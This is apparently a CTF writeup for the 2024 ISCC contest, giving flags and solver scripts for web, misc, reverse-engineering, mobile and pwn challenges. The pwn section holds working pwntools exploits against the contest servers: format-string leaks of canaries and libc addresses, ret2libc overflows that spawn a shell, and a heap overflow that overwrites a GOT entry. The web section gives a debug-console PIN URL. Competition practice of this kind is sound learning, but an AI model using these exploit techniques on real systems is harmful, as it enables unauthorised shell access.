---
title: '2024 ISCC Writeup'
description: '三个数据依次填入exp，注意：第三个需要按h转换16进制，取前四位'
pubDate: 2024-05-10
author: 'IHK-1'
tags: ['CTF', 'ISCC', '2024']
---

# WEB
## 1.web1

```plain
ISCC{MDWTSGTMM + 各个字符的首字母拼接}
```

## 2.web2
```plain
http://101.200.138.180:10006/console?pin=252-749-991
```

# MISC
## 1.misc1
```plain
192.168.1.2,192.168.1.4,24,2024,192.168.1.3,192.168.1.5,0.06,192.168.1.2,192.168.1.3,192.168.1.6,CRC16,4,1

adcca5c2a82064a17a645d35b6b054cd
```

## 2.misc2
```python
from PIL import Image
import openpyxl
from pyzbar import pyzbar

def get_data(path):
    wb = openpyxl.load_workbook(path)
    sheet = wb.active
    data = []

    for row in sheet.iter_rows():
        for cell in row:
            if not cell.font.bold:
                data.append((cell.row, cell.column))

    return len(list(sheet.iter_rows())) + 1, data

def get_image(size, data):
    out = Image.new('L', (size, size))
    for item in data:
        out.putpixel((item[0], item[1]), 255)
    return out

size, data = get_data('attachment-1.xlsx')
qrcode = get_image(size, data)
data = pyzbar.decode(qrcode)[0].data.decode().strip()
print('ISCC{' + data + '}')

```

## 3.misc3

## 4.misc4
```python
import struct

path_list = [r"C:\Users\HK\Desktop\left_foot_invert.png", r"C:\Users\HK\Desktop\left_hand_invert.png",
             r"C:\Users\HK\Desktop\right_foot_invert.png", r"C:\Users\HK\Desktop\right_hand_invert.png"]
data_list = []
png_end = b'IEND\xaeB`'

for path in path_list:
    data = open(path, 'rb').read()
    data = data[data.index(png_end) + len(png_end) + 1:]

    xor_data = b''
    for byte in data:
        xor_data += struct.pack('B', byte ^ 0xff)

    data_list.append(xor_data)

out_data = b''
for i in range(len(data_list[3])):
    for data in data_list:
        out_data += struct.pack('B', data[i])

with open(r"C:\Users\HK\Desktop\out.zip", 'wb') as f:
    f.write(out_data)

```

```python
with open(r"C:\Users\HK\Desktop\true_flag.jpeg", 'rb') as f:
    c = f.read()
from Crypto.Util.number import *

c = bytes_to_long(c)
p = 167722355418488286110758738271573756671
q = 100882503720822822072470797230485840381

e = 65537
d = inverse(e, (p - 1) * (q - 1))
m = pow(c, d, p * q)
print(long_to_bytes(m))

```

# RE
## 1.re1
 追踪check_2

```python
enc=''
s='''int result; // eax

  result = (unsigned __int8)*a1;
  if ( (_BYTE)result == 70 )
  {
    result = (unsigned __int8)a1[1];
    if ( (_BYTE)result == 83 )
    {
      result = (unsigned __int8)a1[2];
      if ( (_BYTE)result == 66 )
      {
        result = (unsigned __int8)a1[3];
        if ( (_BYTE)result == 66 )
        {
          result = (unsigned __int8)a1[4];
          if ( (_BYTE)result == 104 )
          {
            result = (unsigned __int8)a1[5];
            if ( (_BYTE)result == 75 )
            {
              result = (unsigned __int8)a1[6];
              if ( (_BYTE)result == 76 )
              {
                result = (unsigned __int8)a1[7];
                if ( (_BYTE)result == 118 )
                {
                  result = (unsigned __int8)a1[8];
                  if ( (_BYTE)result == 66 )
                  {
                    result = (unsigned __int8)a1[9];
                    if ( (_BYTE)result == 110 )
                    {
                      result = (unsigned __int8)a1[10];
                      if ( (_BYTE)result == 85 )
                      {
                        result = (unsigned __int8)a1[11];
                        if ( (_BYTE)result == 73 )
                        {
                          result = (unsigned __int8)a1[12];
                          if ( (_BYTE)result == 71 )
                          {
                            result = (unsigned __int8)a1[13];
                            if ( (_BYTE)result == 80 )
                            {
                              result = (unsigned __int8)a1[14];
                              if ( (_BYTE)result == 114 )
                              {
                                result = (unsigned __int8)a1[15];
                                if ( (_BYTE)result == 87 )
                                {
                                  result = (unsigned __int8)a1[16];
                                  if ( (_BYTE)result == 107 )
                                  {
                                    result = (unsigned __int8)a1[17];
                                    if ( (_BYTE)result == 87 )
                                    {
                                      result = (unsigned __int8)a1[18];
                                      if ( (_BYTE)result == 71 )
                                      {
                                        result = (unsigned __int8)a1[19];
                                        if ( (_BYTE)result == 106 )
                                        {
                                          result = (unsigned __int8)a1[20];
                                          if ( (_BYTE)result == 113 )
                                          {
                                            result = (unsigned __int8)a1[21];
                                            if ( (_BYTE)result == 71 )
                                            {
                                              result = (unsigned __int8)a1[22];
                                              if ( (_BYTE)result == 117 )
                                              {
                                                result = (unsigned __int8)a1[23];
                                                if ( (_BYTE)result == 118 )
                                                {
                                                  result = (unsigned __int8)a1[24];
                                                  if ( (_BYTE)result == 68 )
                                                  {
                                                    result = (unsigned __int8)a1[25];
                                                    if ( (_BYTE)result == 76 )
                                                    {
                                                      result = (unsigned __int8)a1[26];
                                                      if ( (_BYTE)result == 54 )
                                                      {
                                                        std::operator<<<std::char_traits<char>>(
                                                          refptr__ZSt4cout,
                                                          "yes, this is a flag\n");
                                                        return getchar();'''.split("\n")
for i in s:
    if "(_BYTE)result" in i:
        enc+=chr(int(i.split("==")[1].split(")")[0].strip().strip("'")))
key=[i for i in b"DABBZXQESVFRWNGTHYJUMKIOLPC"]
print([i+51 for i in key])
index=[]
for i in enc:
    if i in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        index.append("ABCDEFGHIJKLMNOPQRSTUVWXYZ".index(i))
    elif i in "abcdefghijklmnopqrstuvwxyz":
        index.append("abcdefghijklmnopqrstuvwxyz".index(i)+0x1a)
    elif i in "0123456789+/-=!#&*()?;:*^%":
        index.append("0123456789+/-=!#&*()?;:*^%".index(i)+0x34)
    else:
        print("wrong")
print(index)
for i in range(len(index)):
    print(chr((key[i]+index[i])),end='')

```

## 2.re2
upx -d 脱壳

三个数据依次填入exp，注意：第三个需要按h转换16进制，取前四位

```cpp
#include<stdio.h>
#include<stdint.h> // Include for int64_t

void decryption(char* enc, char* key, int a3)
{
    char v3; // [rsp+2Bh] [rbp-15h]
    int n; // [rsp+2Ch] [rbp-14h]
    int m; // [rsp+30h] [rbp-10h]
    int k; // [rsp+34h] [rbp-Ch]
    int j; // [rsp+38h] [rbp-8h]
    int i; // [rsp+3Ch] [rbp-4h]
    for (n = 0; n < a3; ++n)
        enc[n] -= 10;
    for (m = 0; m <= a3 - 2; ++m)
        enc[m] += enc[m + 1];
    for (k = 0; k < a3 - 1; ++k)
        enc[k] ^= key[2];
    for (j = 0; j < a3; j += 2)
        enc[j] ^= key[j % 4];
    for (i = 0; i < a3; ++i)
        enc[i] += key[i % 4];
}

int main()
{
    char key2[] = "ISCC";
    int64_t enc[4];
    ((int64_t*)enc)[0] = 0xFC0375D78094C35B;
    ((int64_t*)enc)[1] = 0xF5055BAE15FC7382;
    ((int64_t*)enc)[2] = 0x939BD81D3DD8997A;
    *((int64_t*)(((char*)(&((int64_t*)enc)[3])))) = 0x34DB;
    decryption((char*)enc, key2, 26);
    puts((char*)enc);
}
```

## 3.re3

```python
from ctypes import *
def eqdata(s):
    s = s.replace(";", "").replace(" ", "").split("\n")
    data = []
    for i in s:
        ins = i.split("=")
        data.append(eval(ins[1]))
    return data
def getlbytes(l):
    ans = []
    for i in l:
        get = []
        for j in range(4):
            get.append(i & 0xff)
            i >>= 8
        ans += get
    return ans
key=[ord(i) for i in ('674094872038771148666737')]
def MX(z, y, sum1, k, p, e):
    return c_uint32(((z.value>>5^y.value<<2)+(y.value>>3^z.value<<4))^((sum1.value^y.value)+(k[(p&3)^e.value]^z.value)))
def btea(v,k,n,delta):

    sum1=c_uint32(0)
    n=-n
    rounds=6+52//n
    sum1.value=rounds*delta
    y=c_uint32(v[0])
    e=c_uint32(0)

    while rounds>0:
        e.value=((sum1.value>>2)&3) #e都要32位哦
        for p in range(n-1, 0, -1):
            z=c_uint32(v[p-1])
            #y[p]=c_uint32(v[p]-c_uint32((((z.value>>5^y.value<<2)+(y.value>>3^z.value<<4))^((sum1.value^y.value)+(k[(p&3)^e.value]^z.value)))).value).value
            v[p] = c_uint32(v[p] - MX(z,y,sum1,k,p,e).value).value
            y.value=v[p]

        z=c_uint32(v[n-1])
        #v[n-1]=c_uint32(v[n-1]-c_uint32((((z.value>>5^y.value<<2)+(y.value>>3^z.value<<4))^((sum1.value^y.value)+(k[((n-1)&3)^e.value]^z.value)))).value).value
        v[0] = c_uint32(v[0] - MX(z,y,sum1,k,0,e).value).value
        y.value=v[0]
        sum1.value-=delta
        rounds-=1

    return v

enc=eqdata('''Buf2[0] = 746155582;
    Buf2[1] = 1071098440;
    Buf2[2] = 818944797;
    Buf2[3] = 579286312;
    Buf2[4] = -434804794;
    Buf2[5] = 545235669;''')
key2=[0x12345678, 0x9ABCDEF0, 0xFEDCBA98, 0x76543210]

m=btea(enc, key2, -len(enc), -0x61C88647)
m=getlbytes(m)
for i in range(len(m)):
    m[i]^=(key[i]-ord("0"))
    if i%2==1:
        m[i]-=2
    else:
        m[i]+=3
print("".join(map(chr,m)))

```

## 4.re4

```python
def eqdata(s):
    s = s.replace(";", "").replace(" ", "").split("\n")
    data = []
    for i in s:
        ins = i.split("=")
        data.append(eval(ins[1]))
    return data
key1=[ord(i) for i in "ISCC"]
v4=[2, 0, 3, 1, 6, 4, 7, 5, 10, 8, 11, 9]

enc=eqdata('''v8[0] = 0;
    v8[1] = 16;
    v8[2] = 56;
    v8[3] = 20;
    v8[4] = 17;
    v8[5] = 61;
    v8[6] = 50;
    v8[7] = 43;
    v8[8] = 46;
    v8[9] = 52;
    v8[10] = 20;
    v8[11] = 3;
    v8[12] = 67;
    v8[13] = 89;
    v8[14] = 83;
    v8[15] = 89;
    v8[16] = 70;
    v8[17] = 74;
    v8[18] = 63;
    v8[19] = 103;
    v8[20] = 103;
    v8[21] = 125;
    v8[22] = 103;
    v8[23] = 98;''')
enc2=enc[:12]
enc1_2=enc[12:]
flag=[0]*24
for i in range(12):
    flag[2*i+1]=enc1_2[v4[i]]
for i in range(len(enc2)):
    enc2[i]^=key1[i&3]
for i in range(12):
    flag[2*i]=enc2[i]
print("".join(map(chr,flag)))
```

# mobile
## 1.mobile1

```python
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/* loaded from: classes.dex */
public class Test {
    private static String combineStrings(String arg1, String arg2) {
        return arg1 + arg2;
    }
    private static byte[] customEncrypt(byte[] arg4, byte[] arg5) {
        byte[] v0 = new byte[arg4.length];
        int v1;
        for(v1 = 0; v1 < arg4.length; ++v1) {
            v0[v1] = (byte)(arg4[v1] ^ arg5[v1 % arg5.length]);
        }

        return v0;
    }
    public static String encrypt(String arg3, String arg4) {
        byte[] v0 = {97, -78, -20, -24, 105, 98, -8, -110, 0x7B, 120, 14, -87, (byte)0xE0, 21, 10, -46};
        byte[] v3 = customEncrypt(combineStrings(arg3, arg4).getBytes(StandardCharsets.UTF_8), v0);
        byte[] v4 = new byte[v0.length + v3.length];
        System.arraycopy(v0, 0, v4, 0, v0.length);
        System.arraycopy(v3, 0, v4, v0.length, v3.length);
        return Base64.getEncoder().encodeToString(v4);
    }

    public static String encrypt2(String arg3) {
        byte[] v3 = arg3.getBytes(StandardCharsets.UTF_8);
        int v0 = 0;
        int v1;
        for(v1 = 0; v1 < v3.length; ++v1) {
            v3[v1] = (byte)((v3[v1] + 0x7F) % 0x100);
        }

        byte[] v1_1 = new byte[v3.length];
        while(v0 < v3.length) {
            v1_1[v0] = (byte)(v0 % 2 == 0 ? v3[v0] ^ 0x7B : v3[v0] ^ 0xEA);
            ++v0;
        }

        return Base64.getEncoder().encodeToString(v1_1);
    }

    public static void main(String[] args) {
        System.out.println("ISCC{"+encrypt2(encrypt("04999999", "gwC9nOCNUhsHqZm")).substring(0, 0x20)+"}");
    }
}

```

# PWN
## 1.pwn1
```plain
nc 182.92.237.102 10010
>> 5
>> 104
>> Flag
>> cat flag.txt
```

## 2.pwn2
```python
from pwn import *
from struct import *
from ctypes import *
from LibcSearcher import *
from functools import reduce
import gmpy2

c = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
s    =    lambda a              :pw.send(a)
sl   =    lambda a              :pw.sendline(a)
sa   =    lambda a,b            :pw.sendafter(a,b)
sla  =    lambda a,b            :pw.sendlineafter(a,b)
r    =    lambda a=6666         :pw.recv(a)
rl   =    lambda                :pw.recvline()
ru   =    lambda a,b=True       :pw.recvuntil(a,b)
g64  =    lambda                :u64(pw.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
g32  =    lambda                :u32(pw.recvuntil(b'\xf7').ljust(4,b'\x00'))
gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b'\x00'))
gc   =    lambda a              :u64(pw.recv(7).rjust(8,b'\x00'))
pwpw =    lambda                :pw.interactive()
lss  =    lambda s :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
    
def sb(libc_base):
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

def orw(libc_base):
    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']

def search():
    libc = LibcSearcher("puts", puts)
    libc_base = puts - libc.dump("puts")
    system = libc.dump("system") + libc_base
    binsh = libc.dump("str_bin_sh") + libc_base
    return system,binsh

def dbg(a=''):
    if a !='':
        gdb.attach(pw,a) 
        pause()
    else:
        gdb.attach(pw)  
        pause()
    
context.arch='amd64'
file = './2'
elf = ELF(file)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
debug = 1
if debug == 0:
    pw = process(file)
if debug == 1:
    pw = remote('182.92.237.102',10011)

pay = b'flagis,%15$p,%17$p'
sl(pay)
ru(b'>>')
canary = int(ru(b','),16)
pie_base = int(ru(b' '),16)-254-elf.sym['main']
lss('canary')
lss('pie_base')

pay=b'exit'.ljust(0x38,b'\x00')+p64(canary)*2+p64(pie_base+0x1291)
sl(pay)

pwpw()
```

## 3.pwn3
```python
from pwn import *
from struct import *
from ctypes import *
from LibcSearcher import *
from functools import reduce
import gmpy2

c = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
s    =    lambda a              :pw.send(a)
sl   =    lambda a              :pw.sendline(a)
sa   =    lambda a,b            :pw.sendafter(a,b)
sla  =    lambda a,b            :pw.sendlineafter(a,b)
r    =    lambda a=6666         :pw.recv(a)
rl   =    lambda                :pw.recvline()
ru   =    lambda a,b=True       :pw.recvuntil(a,b)
g64  =    lambda                :u64(pw.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
g32  =    lambda                :u32(pw.recvuntil(b'\xf7').ljust(4,b'\x00'))
gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b'\x00'))
gc   =    lambda a              :u64(pw.recv(7).rjust(8,b'\x00'))
pwpw =    lambda                :pw.interactive()
lss  =    lambda s :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
    
def sb(libc_base):
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

def orw(libc_base):
    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']

def search():
    libc = LibcSearcher("puts", puts)
    libc_base = puts - libc.dump("puts")
    system = libc.dump("system") + libc_base
    binsh = libc.dump("str_bin_sh") + libc_base
    return system,binsh

def dbg(a=''):
    if a !='':
        gdb.attach(pw,a) 
        pause()
    else:
        gdb.attach(pw)  
        pause()
    
context.arch='amd64'
file = './3'
elf = ELF(file)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
debug = 1
if debug == 0:
    pw = process(file)
if debug == 1:
    pw = remote('182.92.237.102',10012)

sl(b'%27$p,%19$p')
ru(b'answered:\n')

__libc_start_main = int(ru(b','),16)-245
# libc_base = __libc_start_main-0x01ade0
libc = LibcSearcher("__libc_start_main", __libc_start_main)
libc_base = __libc_start_main - libc.dump("__libc_start_main")
system = libc.dump("system") + libc_base
binsh = libc.dump("str_bin_sh") + libc_base

canary = int(ru(b'\n'),16)
lss('libc_base')
lss('canary')

pay = b'a'.ljust(0x88,b'\x00')+p32(canary)+b'a'*0xc+p32(0x0804900e)+p32(system)*2+p64(binsh)
sl(pay)
pwpw()
```

## 4.pwn4
```python
from pwn import *
from struct import *
from ctypes import *
from LibcSearcher import *
from functools import reduce
import gmpy2
#import ctf_pb2

c = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
s    =    lambda a              :pw.send(a)
sl   =    lambda a              :pw.sendline(a)
sa   =    lambda a,b            :pw.sendafter(a,b)
sla  =    lambda a,b            :pw.sendlineafter(a,b)
r    =    lambda a=6666         :pw.recv(a)
rl   =    lambda                :pw.recvline()
ru   =    lambda a,b=True       :pw.recvuntil(a,b)
g64  =    lambda                :u64(pw.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
g32  =    lambda                :u32(pw.recvuntil(b'\xf7').ljust(4,b'\x00'))
gl   =    lambda a              :u64(pw.recvuntil(a,drop=True).ljust(8,b'\x00'))
gc   =    lambda a              :u64(pw.recv(7).rjust(8,b'\x00'))
pwpw =    lambda                :pw.interactive()
lss  =    lambda s :log.success('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))

def sb(libc_base):
    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

def orw(libc_base):
    return libc_base + libc.sym['open'], libc_base + libc.sym['read'], libc_base + libc.sym['write']

def search():
    libc = LibcSearcher("puts", puts)
    libc_base = puts - libc.dump("puts")
    system = libc.dump("system") + libc_base
    binsh = libc.dump("str_bin_sh") + libc_base
    return system,binsh

def dbg(a=''):
    if a !='':
        gdb.attach(pw,a) 
        pause()
    else:
        gdb.attach(pw)  
        pause()

context.arch='amd64'
# context.arch = 'i386'
file = './4'
elf = ELF(file)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
debug = 1
if debug == 0:
    pw = process(file)
if debug == 1:
    pw = remote('182.92.237.102',10019)

sl("I'm ready for shopping")

system_plt = elf.plt['system']
sleep(3)

def add(size,n,content=''):
    sla(b'Action: ',str(1))
    sla(b'Item ID: ',str(size))
    sla(b'Quantity: ',str(n))
    if content == '':
        sla(b'(0/1): ',str(0))
    else:
        sla(b'(0/1): ',str(1))
        sa(b'Message: ',content)

for i in range(12):
    add(0x4000,1000)

# dbg('b *0x400c0f')
add(0x4000,262,'0'*0x3FF0)
payload = b'1'*0x50 + p32(0) + p32(3) + 10*p64(0x60201d)
sleep(2)
s(payload)

sleep(0.2)
payload = b'/bin/sh'.ljust(0xB,b'\x00') + p64(system_plt)
payload = payload.ljust(0x60,b'b')
add(0x60,0,payload)

pwpw()

```

